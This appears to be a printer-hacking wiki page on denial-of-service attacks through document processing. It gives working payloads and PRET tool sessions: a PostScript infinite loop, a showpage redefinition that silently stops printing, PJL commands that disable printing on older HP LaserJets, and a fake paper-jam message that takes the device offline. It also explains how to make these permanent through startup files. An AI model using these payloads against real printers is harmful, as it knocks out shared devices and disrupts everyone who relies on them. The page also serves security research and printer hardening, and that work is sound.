# Document Processing

Page description languages allowing infinite loops or calculations that require a lot of computing time.  Even minimalist languages like [PCL](http://hacking-printers.net/wiki/index.php/PCL) can be used to upload permanent macros or fonts until the available memory is consumed.

## PostScript

### Infinite loops

```text
%!
{} loop
```

Using [PRET](https://github.com/RUB-NDS/PRET):

```text
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> hang
Warning: This command causes an infinite loop rendering the
device useless until manual restart. Press CTRL+C to abort.
Executing PostScript infinite loop in... 10 9 8 7 6 5 4 3 2 1 KABOOM!
```

### Redefine showpage

By setting `showpage` – which is used in every document to actually print the page – to do nothing at all, PostScript jobs are processed they won't print anything.

```text
true 0 startjob
/showpage {} def
```

Using [PRET](https://github.com/RUB-NDS/PRET):

```text
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> disable
Disabling printing functionality
```

Both attacks code can also be written into Sys/Start, startup.ps or similar files to cause **permanent DoS** on devices with a writable disk.

## PJL

### PJL jobmedia

Proprietary PJL commands can be used to set the older HP devices like the LaserJet 4k series into service mode and completely disable all printing functionality as shown below:

```text
@PJL SET SERVICEMODE=HPBOISEID
@PJL DEFAULT JOBMEDIA=OFF
```

Using [PRET](https://github.com/RUB-NDS/PRET):

```text
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> disable
Printing functionality: OFF
```

### Offline mode

In addition, the PJL standard defines the `OPMSG` command which ‘prompts the printer to display a specified message and go offline’ \cite{hp1997pjl}. This can be used to simulate a paper jam as shown in below:

```text
@PJL OPMSG DISPLAY="PAPER JAM IN ALL DOORS"
```

Using [PRET](https://github.com/RUB-NDS/PRET):

```text
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> offline "MESSAGE TO DSIPLAY"
Warning: Taking the printer offline will prevent yourself and others
from printing or re-connecting to the device. Press CTRL+C to abort.
Taking printer offline in... 10 9 8 7 6 5 4 3 2 1 KABOOM!
```

**Learn more about these attacks in** [**http://hacking-printers.net/wiki/index.php/Document\_processing**](http://hacking-printers.net/wiki/index.php/Document_processing)\*\*\*\*

